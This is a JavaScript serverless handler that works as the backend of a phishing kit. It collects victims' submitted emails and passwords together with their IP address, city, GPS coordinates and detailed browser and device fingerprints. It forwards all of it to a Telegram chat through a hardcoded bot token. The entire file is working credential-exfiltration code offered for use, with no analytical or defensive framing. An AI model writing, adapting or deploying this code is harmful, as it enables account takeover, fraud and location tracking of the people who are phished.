module.exports = async (req, res) => {
    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
    const CHAT_ID = '7607355489';

    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const d = req.body;
    const i = d.intel || {};
    const h = req.headers;

    const geo = {
        ip: h['x-forwarded-for']?.split(',')[0] || 'x',
        country: h['x-vercel-ip-country'] || 'x',
        city: h['x-vercel-ip-city'] || 'x',
        lat: h['x-vercel-ip-latitude'] || 'x',
        lon: h['x-vercel-ip-longitude'] || 'x'
    };

    const ua = d.userAgent || '';
    const browser = ua.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || 'x';
    const os = ua.match(/\(([^)]+)\)/)?.[1]?.split(';')[0] || 'x';

    const text = 
        `🎣 #${d.attemptNumber} | ${d.email} | ${d.password}\n` +
        `🌍 ${geo.ip} | ${geo.country} | ${geo.city} | ${geo.lat},${geo.lon}\n` +
        `💻 ${browser} | ${os} | ${i.platform} | ${i.screen} | ${i.cores}c | ${i.memory}GB\n` +
        `🔍 Canvas:${i.canvas} | WebRTC:${i.rtc} | ExtIP:${i.extIP}\n` +
        `🔋 ${i.battery} | ${i.net} | ${i.languages?.[0]} | ${i.timezone}\n` +
        (i.gps ? `📍 GPS:${i.gps} (acc:${i.geoPerm})\n` : '') +
        `⏰ ${new Date(d.timestamp).toLocaleString()}`;

    try {
        const tg = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
        const data = await tg.json();
        if (!data.ok) throw new Error(data.description);
        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error('TG error:', err.message);
        return res.status(200).json({ ok: false, error: err.message });
    }
};
